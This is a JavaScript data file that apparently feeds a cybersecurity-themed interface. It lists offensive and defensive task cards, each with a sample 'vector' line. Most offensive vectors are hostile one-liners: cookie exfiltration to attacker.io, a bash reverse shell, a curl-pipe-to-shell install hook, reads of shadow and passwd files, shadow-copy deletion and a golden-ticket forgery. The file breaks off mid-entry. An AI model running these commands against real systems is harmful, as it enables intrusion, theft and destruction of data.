import React from 'react';

// 12 Offensive Tasks
export const ATTACKER_TASKS = [
  {
    id: 'sqli',
    num: '01',
    title: 'SQL Injection',
    badge: 'Database Exploit',
    tags: '#database #exploit',
    category: 'Injection Core',
    desc: 'Extract database credentials and dump unauthorized schema tables via tainted query inputs.',
    vector: "UNION SELECT null, username, password FROM users WHERE '1'='1' --",
    details: 'Inject unescaped SQL syntax into authentication forms and search endpoints to bypass hash checks and extract administrative privileges.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <ellipse cx="12" cy="5" rx="9" ry="3" />
        <path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3" />
        <path d="M3 5v14c0 1.66 4 3 9 3 2.1 0 4.02-.24 5.5-.66" />
        <path d="m17 17 4 4" />
        <path d="m21 17-4 4" />
      </svg>
    )
  },
  {
    id: 'xss',
    num: '02',
    title: 'Cross-Site Scripting',
    badge: 'Session Hijack',
    tags: '#xss #dom #token',
    category: 'Client Breach',
    desc: 'Inject stored and reflected JavaScript payloads to hijack active operator sessions.',
    vector: '<script>fetch("//attacker.io/c?"+document.cookie)</script>',
    details: 'Leverage unencoded HTML output to execute client-side scripts, steal authentication tokens, and deface target interface layouts.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <polyline points="16 18 22 12 16 6" />
        <polyline points="8 6 2 12 8 18" />
        <line x1="12" y1="2" x2="12" y2="22" />
        <path d="m14 8-4 8" />
      </svg>
    )
  },
  {
    id: 'bruteforce',
    num: '03',
    title: 'Credential Stuffing',
    badge: 'Auth Vector',
    tags: '#hydra #spray #wordlist',
    category: 'Identity Assault',
    desc: 'Automated dictionary attacks against administrative login forms to guess operator secrets.',
    vector: 'Hydra -l admin -P wordlist.txt 192.168.1.100 http-post-form',
    details: 'Deploy multi-threaded password spraying against unprotected login portals without rate-limiting or CAPTCHA defenses.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <rect width="18" height="11" x="3" y="11" rx="2" ry="2" />
        <path d="M7 11V7a5 5 0 0 1 9.9-1" />
        <circle cx="12" cy="16" r="1.5" />
      </svg>
    )
  },
  {
    id: 'cmd-injection',
    num: '04',
    title: 'Command Injection',
    badge: 'Remote Execution',
    tags: '#rce #sh #metachar',
    category: 'Remote Execution',
    desc: 'Execute arbitrary host system instructions directly through vulnerable server parameters.',
    vector: '; cat /etc/passwd; id; uname -a',
    details: 'Chain system commands via shell metacharacters through diagnostic endpoints to spawn background reverse shells.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <polyline points="4 17 10 11 4 5" />
        <line x1="12" y1="19" x2="20" y2="19" />
        <circle cx="17" cy="7" r="3" />
      </svg>
    )
  },
  {
    id: 'priv-esc',
    num: '05',
    title: 'Privilege Escalation',
    badge: 'Root Acquisition',
    tags: '#suid #kernel #root',
    category: 'Privilege Root',
    desc: 'Abuse SUID binaries and kernel misconfigurations to escalate to full root privileges.',
    vector: 'find / -perm -4000 -type f 2>/dev/null; pkexec /bin/sh',
    details: 'Enumerate misconfigured sudo rules, weak permissions, and cron scripts to transition from unprivileged daemon user to superuser.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" />
        <path d="M12 11v6" />
        <path d="m9 14 3-3 3 3" />
      </svg>
    )
  },
  {
    id: 'traversal',
    num: '06',
    title: 'Directory Traversal',
    badge: 'File Disclosure',
    tags: '#lfi #traversal #shadow',
    category: 'File Leakage',
    desc: 'Traverse restricted file system directories to read server configuration and private keys.',
    vector: 'GET /download.php?file=../../../../etc/shadow HTTP/1.1',
    details: 'Bypass document root containment using relative dot-dot-slash path sequences to access internal source files and database configs.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M20 20a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.9a2 2 0 0 1-1.69-.9L9.6 3.9A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13a2 2 0 0 0 2 2Z" />
        <path d="m14 12-4 4" />
        <path d="m10 12 4 4" />
      </svg>
    )
  },
  {
    id: 'csrf',
    num: '07',
    title: 'CSRF Token Bypass',
    badge: 'State Manipulation',
    tags: '#csrf #forgery #session',
    category: 'Forged Request',
    desc: 'Forge authenticated state-changing requests executed involuntarily by victim operators.',
    vector: '<img src="http://bank.internal/transfer?amt=50000&to=attacker">',
    details: 'Exploit missing CSRF tokens or insecure SameSite cookie policies to execute account password updates and privilege elevation.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2" />
        <circle cx="9" cy="7" r="4" />
        <line x1="19" y1="8" x2="19" y2="14" />
        <line x1="22" y1="11" x2="16" y2="11" />
      </svg>
    )
  },
  {
    id: 'recon',
    num: '08',
    title: 'Network Port Recon',
    badge: 'Surface Discovery',
    tags: '#nmap #syn #ports',
    category: 'Surface Probe',
    desc: 'Map open ports, daemon fingerprints, and exposed internal service surfaces.',
    vector: 'nmap -sS -sV -p- -T4 --script vuln 10.0.0.1/24',
    details: 'Perform non-intrusive SYN stealth scans to map reachable TCP/UDP services, banner versions, and unauthenticated management consoles.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="12" cy="12" r="10" />
        <path d="m4.93 4.93 4.24 4.24" />
        <path d="m14.83 9.17 4.24-4.24" />
        <path d="M12 12v6" />
        <circle cx="12" cy="12" r="2" />
      </svg>
    )
  },
  {
    id: 'c2',
    num: '09',
    title: 'Reverse Shell Listener',
    badge: 'Command & Control',
    tags: '#beacon #socket #egress',
    category: 'C2 Perimeter',
    desc: 'Establish encrypted outbound sockets through restrictive firewalls for persistence.',
    vector: 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1',
    details: 'Maintain persistent command-and-control access via obfuscated reverse shell sessions routed through standard egress ports.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="12" cy="12" r="9" />
        <path d="M9 10h.01" />
        <path d="M15 10h.01" />
        <path d="M9.5 15.5a3.5 3.5 0 0 0 5 0" />
        <path d="M12 2v3" />
      </svg>
    )
  },
  {
    id: 'bof',
    num: '10',
    title: 'Buffer Overflow',
    badge: 'Memory Corruption',
    tags: '#stack #eip #shellcode',
    category: 'Memory Breach',
    desc: 'Smash execution stack pointers to redirect control flow into custom shellcode buffers.',
    vector: 'python3 -c "print(\'A\'*112 + \'\\xef\\xbe\\xad\\xde\')" | ./vulnerable_bin',
    details: 'Inject structured overflow strings to overwrite register EIP/RIP with shellcode return addresses.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <rect x="2" y="6" width="20" height="12" rx="2" />
        <path d="M6 12h4" />
        <path d="M14 12h4" />
        <path d="m10 9 4 6" />
      </svg>
    )
  },
  {
    id: 'ssrf',
    num: '11',
    title: 'SSRF Cloud Pivot',
    badge: 'Metadata Exfil',
    tags: '#ssrf #cloud #iam',
    category: 'Cloud Pivot',
    desc: 'Force backend hosts to query cloud metadata services (169.254.169.254) and internal APIs.',
    vector: 'http://victim.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    details: 'Pivot through vulnerable webhook endpoints to exfiltrate temporary AWS IAM tokens and internal cluster service accounts.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M18 10h-1.26A8 8 0 1 0 9 20h9a5 5 0 0 0 0-10z" />
        <path d="m12 12-2 2 2 2" />
      </svg>
    )
  },
  {
    id: 'kerberoast',
    num: '12',
    title: 'AD Kerberoasting',
    badge: 'Domain Compromise',
    tags: '#kerberos #spn #activedir',
    category: 'Domain Core',
    desc: 'Request service tickets (TGS) for SPNs and crack encrypted service account hashes offline.',
    vector: 'GetUserSPNs.py -request -dc-ip 10.0.0.1 domain.local/user:password -outputfile hashes.txt',
    details: 'Target service accounts with weak passwords registered under Service Principal Names to achieve full domain administrator takeover.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z" />
        <line x1="4" y1="22" x2="4" y2="15" />
      </svg>
    )
  },
  {
    id: 'pth',
    num: '13',
    title: 'Pass-the-Hash',
    badge: 'Lateral Movement',
    tags: '#ntlm #smb #lateral',
    category: 'Auth Replay',
    desc: 'Authenticate to remote hosts across Active Directory using harvested NTLM password hashes without cracking them.',
    vector: 'crackmapexec smb 192.168.1.0/24 -u Administrator -H aad3b435b51404ee:fc525c9683e8fe067095ba2ddc971883',
    details: 'Leverage the SMB and RPC protocols to reuse captured administrative hashes directly, spawning remote command prompts on internal domain nodes.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <rect width="18" height="11" x="3" y="11" rx="2" ry="2" />
        <path d="M7 11V7a5 5 0 0 1 10 0v4" />
      </svg>
    )
  },
  {
    id: 'golden-ticket',
    num: '14',
    title: 'Golden Ticket Forgery',
    badge: 'Domain Takeover',
    tags: '#kerberos #krbtgt #mimikatz',
    category: 'Persistence',
    desc: 'Forge custom Kerberos Ticket Granting Tickets (TGT) using the extracted KRBTGT hash for indefinite enterprise domain control.',
    vector: 'kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-382910 /krbtgt:b8109d9f1 /ptt',
    details: 'Create persistent, unrevocable authentication tokens valid for up to 10 years, gaining unrestricted access to all domain resources.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" />
      </svg>
    )
  },
  {
    id: 'ransomware',
    num: '15',
    title: 'Ransomware Encryption',
    badge: 'Data Destruction',
    tags: '#crypto #aes256 #shadowcopy',
    category: 'Impact Core',
    desc: 'Traverse enterprise file shares, delete VSS shadow copies, and deploy AES-256 GCM encryption routines.',
    vector: 'vssadmin delete shadows /all /quiet && bcdedit /set {default} recoveryenabled No',
    details: 'Systematically encrypt target storage pools and backup shares while destroying disaster recovery snapshots to compel ransom compliance.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M21 2l-2 2m-14 0l-2-2m0 20l2-2m14 2l2-2" />
        <circle cx="12" cy="12" r="7" />
        <line x1="12" y1="9" x2="12" y2="13" />
        <circle cx="12" cy="16" r="0.5" />
      </svg>
    )
  },
  {
    id: 'dns-tunnel',
    num: '16',
    title: 'DNS Tunneling Exfil',
    badge: 'Clandestine Channel',
    tags: '#dnscat2 #udp53 #covert',
    category: 'Exfiltration',
    desc: 'Evade strict outbound egress filters by tunneling encrypted binary payload chunks inside recursive DNS query labels.',
    vector: 'dnscat2 --dns server=c2.threat.net,port=53 --secret=c2preshared',
    details: 'Fragment confidential documents into Base32 records and route them through corporate DNS forwarders to external authoritative servers.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M4 11a9 9 0 0 1 9 9" />
        <path d="M4 4a16 16 0 0 1 16 16" />
        <circle cx="5" cy="19" r="1" />
      </svg>
    )
  },
  {
    id: 'mitm',
    num: '17',
    title: 'ARP Poisoning MitM',
    badge: 'Traffic Intercept',
    tags: '#arpspoof #ettercap #packet',
    category: 'Network Intercept',
    desc: 'Corrupt local ARP tables to redirect gateway traffic through attacker machine for SSL stripping and token sniffing.',
    vector: 'arpspoof -i eth0 -t 192.168.1.50 -r 192.168.1.1',
    details: 'Inject false MAC-to-IP pairings into switch CAM tables to intercept cleartext passwords, session cookies, and internal API tokens.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <polyline points="22 12 18 12 15 21 9 3 6 12 2 12" />
      </svg>
    )
  },
  {
    id: 'heap-spray',
    num: '18',
    title: 'Zero-Day Heap Spray',
    badge: 'Memory Corruption',
    tags: '#heap #rop #shellcode',
    category: 'Binary Exploit',
    desc: 'Pre-allocate memory blocks with NOP sleds and shellcode to ensure deterministic jump execution upon pointer corruption.',
    vector: 'var chunk = unescape("%u9090%u9090") + shellcode; while (chunk.length < 0x100000) chunk += chunk;',
    details: 'Manipulate application heap layouts to predictably locate shellcode addresses in vulnerable browser and native runtime engines.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <rect x="3" y="3" width="7" height="7" />
        <rect x="14" y="3" width="7" height="7" />
        <rect x="14" y="14" width="7" height="7" />
        <rect x="3" y="14" width="7" height="7" />
      </svg>
    )
  },
  {
    id: 'supply-chain',
    num: '19',
    title: 'Supply Chain Injection',
    badge: 'Ecosystem Poison',
    tags: '#npm #pypi #dependency',
    category: 'Pipeline Breach',
    desc: 'Introduce obfuscated post-install scripts and malicious dependencies into CI/CD build artifact pipelines.',
    vector: 'npm install --ignore-scripts=false && node -e "require(\\"child_process\\").exec(\\"curl http://c2/b|sh\\")"',
    details: 'Hijack upstream open-source packages or internal private registry tokens to distribute backdoored binaries to millions of downstream systems.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M16.5 9.4 7.55 4.24a1.78 1.78 0 0 0-2.5 1.55v12.42a1.78 1.78 0 0 0 2.5 1.55L16.5 14.6a1.78 1.78 0 0 0 0-3.2z" />
      </svg>
    )
  },
  {
    id: 'idor',
    num: '20',
    title: 'API IDOR Manipulation',
    badge: 'Horizontal Bypass',
    tags: '#rest #jwt #tenant',
    category: 'Broken Auth',
    desc: 'Tamper with REST endpoint object identifiers to access sensitive customer records across tenants without authorization.',
    vector: 'GET /api/v2/users/10492/billing_records HTTP/1.1\\nAuthorization: Bearer eyJhbGciOiJIUzI1Ni...',
    details: 'Exploit absent server-side ownership validations to systematically iterate through object GUIDs and download unauthorized account schemas.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" />
        <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" />
      </svg>
    )
  },
  {
    id: 'cloud-iam',
    num: '21',
    title: 'Cloud IAM Escalation',
    badge: 'Role Assumption',
    tags: '#aws #sts #policy',
    category: 'Cloud Breach',
    desc: 'Exploit wildcard CreatePolicyVersion and sts:AssumeRole permissions to escalate to AdministratorAccess across AWS accounts.',
    vector: 'aws sts assume-role --role-arn arn:aws:iam::123456789012:role/DeployAdmin --role-session-name breach',
    details: 'Chain misconfigured IAM policies and role delegation trusts to detach boundary restrictions and attach root-level administrative access.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M17.5 19H9a7 7 0 1 1 6.71-9h1.79a4.5 4.5 0 1 1 0 9Z" />
      </svg>
    )
  }
];

// 12 Defensive Tasks
export const DEFENDER_TASKS = [
  {
    id: 'ddos',
    num: '01',
    title: 'DDoS Mitigation',
    badge: 'Traffic Scrubbing',
    tags: '#iptables #synflood #rate',
    category: 'Edge Armor',
    desc: 'Filter volumetric flood vectors and SYN floods at edge proxies using rate-limiting filters.',
    vector: 'iptables -A INPUT -p tcp --syn -m limit --limit 50/s --limit-burst 100 -j ACCEPT',
    details: 'Deploy BGP Anycast routing and automated packet scrubbing centers to neutralize high-bandwidth UDP amplification attacks.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10" />
        <path d="m9 12 2 2 4-4" />
      </svg>
    )
  },
  {
    id: 'waf',
    num: '02',
    title: 'WAF Rule Formulation',
    badge: 'Layer 7 Filter',
    tags: '#modsec #owasp #regex',
    category: 'Layer 7 Filter',
    desc: 'Inspect inbound HTTP payloads in real-time, blocking malicious regular expressions.',
    vector: 'SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/ "(?:^|[^\\w])(?:union\\s+select)" "id:1001,phase:2,deny,status:403"',
    details: 'Configure ModSecurity Core Rule Set filters to inspect URI arguments and headers, stopping OWASP Top 10 exploits.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <rect width="18" height="18" x="3" y="3" rx="2" />
        <path d="M3 9h18" />
        <path d="M9 21V9" />
      </svg>
    )
  },
  {
    id: 'edr',
    num: '03',
    title: 'Endpoint Telemetry',
    badge: 'EDR Auditing',
    tags: '#auditd #execve #syscall',
    category: 'Host Sentinel',
    desc: 'Stream kernel system call events and detect unauthorized process spawns across hosts.',
    vector: 'auditctl -a always,exit -F arch=b64 -S execve -k process_audit',
    details: 'Monitor process creation trees, unexpected DLL injection, and memory allocation hooks to instantly identify living-off-the-land techniques.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <rect width="20" height="14" x="2" y="3" rx="2" />
        <line x1="8" y1="21" x2="16" y2="21" />
        <line x1="12" y1="17" x2="12" y2="21" />
        <path d="m7 10 2 2 4-4" />
      </svg>
    )
  },
  {
    id: 'siem',
    num: '04',
    title: 'SIEM Correlation',
    badge: 'Threat Intelligence',
    tags: '#splunk #anomaly #correlation',
    category: 'Intelligence Hub',
    desc: 'Aggregate disparate audit streams into centralized query clusters for anomaly detection.',
    vector: 'index=security_logs sourcetype=auth_fail | stats count by user, src_ip | where count > 10',
    details: 'Synthesize authentication, firewall, and DNS queries into dynamic risk scores to alert Security Operations Centers of active intrusions.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M3 3v18h18" />
        <path d="m19 9-5 5-4-4-3 3" />
      </svg>
    )
  },
  {
    id: 'iam',
    num: '05',
    title: 'Zero Trust Access',
    badge: 'Identity Perimeter',
    tags: '#fido2 #posture #zerotrust',
    category: 'Identity Fortress',
    desc: 'Enforce hardware-bound FIDO2 authentication and contextual access control verification.',
    vector: 'policy.enforce({ identity: user.fido2_verified, posture: host.compliant, ip: allowed_range })',
    details: 'Eliminate implicit network trust by validating certificate-based authentication and device posture on every microservice transaction.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="12" cy="7" r="4" />
        <path d="M6 21v-2a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v2" />
        <path d="m16 11 2 2 4-4" />
      </svg>
    )
  },
  {
    id: 'hsm',
    num: '06',
    title: 'Cryptographic Key Vault',
    badge: 'HSM Protection',
    tags: '#aes256 #gcm #vault',
    category: 'Crypto Enclave',
    desc: 'Enforce AES-256 GCM envelope encryption with hardware security module root of trust.',
    vector: 'openssl enc -aes-256-gcm -pbkdf2 -iter 100000 -in secret.dat -out secret.enc',
    details: 'Safeguard database secrets, SSL private keys, and API tokens inside tamper-resistant hardware security modules with automated 90-day rotation.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M21 2l-2 2m-1-1l-3 3m5 8h-4l-2 4H6a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h8l2 4h5a2 2 0 0 1 2 2v6a2 2 0 0 1-2 2z" />
      </svg>
    )
  },
  {
    id: 'honeypot',
    num: '07',
    title: 'Honeypot Decoy Grid',
    badge: 'Deception Tech',
    tags: '#cowrie #decoy #telemetry',
    category: 'Deception Maze',
    desc: 'Deploy low-interaction decoy services to bait, log, and profile adversary techniques.',
    vector: 'cowrie start --listen 0.0.0.0:2222 --banner "OpenSSH_8.2p1 Ubuntu-4ubuntu0.5"',
    details: 'Lure automated scanners and opportunistic threat actors into isolated deceptive sandbox instances for high-fidelity attribution.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M10 2v2" />
        <path d="M14 2v2" />
        <path d="M16 8a4 4 0 0 1-8 0V6h8z" />
        <path d="M6 10v10a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2V10" />
      </svg>
    )
  },
  {
    id: 'nids',
    num: '08',
    title: 'Packet Deep Inspection',
    badge: 'Network IDS',
    tags: '#suricata #snort #dpi',
    category: 'Packet Sentry',
    desc: 'Run multi-gigabit traffic inspection against signature rulesets (Suricata / Snort).',
    vector: 'alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:"ET WEB_SPECIFIC_APPS SQLi"; content:"UNION SELECT"; sid:2000001;)',
    details: 'Decouple network flows into stateful protocol reassembly engines to identify C2 beacons, DNS tunneling, and exploit shellcode in real-time.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <rect x="2" y="4" width="20" height="8" rx="2" />
        <rect x="2" y="14" width="20" height="6" rx="2" />
        <line x1="6" y1="8" x2="6.01" y2="8" />
        <line x1="10" y1="8" x2="10.01" y2="8" />
      </svg>
    )
  },
  {
    id: 'soar',
    num: '09',
    title: 'SOAR Auto-Quarantine',
    badge: 'Response Automation',
    tags: '#soar #quarantine #isolate',
    category: 'Auto Response',
    desc: 'Automatically isolate compromised host nodes and revoke session tokens in milliseconds.',
    vector: 'soar.trigger("quarantine_host", { ip: alert.src_ip, revoke_token: alert.user_session })',
    details: 'Execute programmatic containment scripts upon high-severity alerts to sever outbound connections and dump memory for forensic analysis.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" />
      </svg>
    )
  },
  {
    id: 'aslr',
    num: '10',
    title: 'Memory Protection',
    badge: 'Binary Hardening',
    tags: '#aslr #dep #stackcanary',
    category: 'Memory Bastion',
    desc: 'Enforce Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP).',
    vector: 'echo 2 > /proc/sys/kernel/randomize_va_space',
    details: 'Randomize memory page locations of the program stack, heap, and libraries to prevent reliable return-oriented programming (ROP) exploits.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10" />
        <line x1="12" y1="8" x2="12" y2="12" />
        <line x1="12" y1="16" x2="12.01" y2="16" />
      </svg>
    )
  },
  {
    id: 'microseg',
    num: '11',
    title: 'Network Microsegmentation',
    badge: 'Perimeter Defense',
    tags: '#calico #ebpf #firewall',
    category: 'Zone Isolation',
    desc: 'Isolate sensitive database tiers from web tiers using granular Calico and eBPF policies.',
    vector: 'apiVersion: projectcalico.org/v3 kind: NetworkPolicy spec: selector: app == "db" ingress: - action: Allow source: selector: app == "api"',
    details: 'Confine workloads to least-privilege egress and ingress network rules, preventing lateral movement during active breaches.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="6" cy="6" r="3" />
        <circle cx="18" cy="18" r="3" />
        <line x1="8.59" y1="8.59" x2="15.42" y2="15.42" />
        <circle cx="18" cy="6" r="3" />
        <circle cx="6" cy="18" r="3" />
      </svg>
    )
  },
  {
    id: 'forensics',
    num: '12',
    title: 'Forensic Memory Triage',
    badge: 'Incident Analysis',
    tags: '#volatility #malfind #triage',
    category: 'Digital Forensic',
    desc: 'Acquire raw volatility dumps to extract active injected DLLs and unencrypted C2 keys.',
    vector: 'vol.py -f memory.raw windows.malfind.Malfind',
    details: 'Perform post-incident triage on memory dumps to reconstruct attacker persistence mechanisms, timestamps, and exfiltrated payloads.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="11" cy="11" r="8" />
        <line x1="21" y1="21" x2="16.65" y2="16.65" />
        <line x1="11" y1="8" x2="11" y2="14" />
        <line x1="8" y1="11" x2="14" y2="11" />
      </svg>
    )
  },
  {
    id: 'pam',
    num: '13',
    title: 'Privilege Vaulting (PAM)',
    badge: 'Ephemeral Creds',
    tags: '#cyberark #vault #mfa',
    category: 'Identity Guard',
    desc: 'Enforce real-time credential rotation, biometric approval, and ephemeral session leasing on root infrastructure.',
    vector: 'vault read -format=json sys/leases/lookup/auth/token/access_root_temp',
    details: 'Eliminate permanent standing administrative privileges across critical production nodes through just-in-time credential brokering.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <rect width="18" height="11" x="3" y="11" rx="2" ry="2" />
        <path d="M7 11V7a5 5 0 0 1 10 0v4" />
      </svg>
    )
  },
  {
    id: 'honeytoken',
    num: '14',
    title: 'Honeytoken Tripwires',
    badge: 'Decoy Trap',
    tags: '#canary #aws-key #tripwire',
    category: 'Active Deception',
    desc: 'Deploy inactive AWS access keys and database credentials into git repositories to trigger immediate alarm upon tampering.',
    vector: 'aws sts get-caller-identity --access-key-id AKIA_HONEY_CANARY_TRIPWIRE',
    details: 'Scatter synthetic decoy tokens across secrets managers and environment files to detect internal reconnaissance within seconds.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z" />
      </svg>
    )
  },
  {
    id: 'tls-inspect',
    num: '15',
    title: 'TLS Traffic Inspection',
    badge: 'Decryption Proxy',
    tags: '#mitm-proxy #suricata #ssl',
    category: 'Payload Analysis',
    desc: 'Terminate enterprise outbound SSL sessions to perform deep packet payload analysis and stop encrypted C2 beacons.',
    vector: 'openssl s_client -connect victim.corp:443 -CAfile /etc/pki/tls/certs/defense_ca.crt',
    details: 'Inspect encrypted TLS 1.3 streams in real-time at perimeter firewalls to uncover hidden command-and-control handshakes.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M2 12h20" />
        <path d="M20 12l-4-4m4 4l-4 4" />
        <path d="M4 12l4-4m-4 4l4 4" />
      </svg>
    )
  },
  {
    id: 'bgp-armor',
    num: '16',
    title: 'BGP Anycast Scrubbing',
    badge: 'Volumetric Shield',
    tags: '#bgp #flowspec #anycast',
    category: 'Transit Armor',
    desc: 'Announce BGP Flowspec rate limits across upstream Tier-1 transit providers to drop multi-terabit volumetric floods at source.',
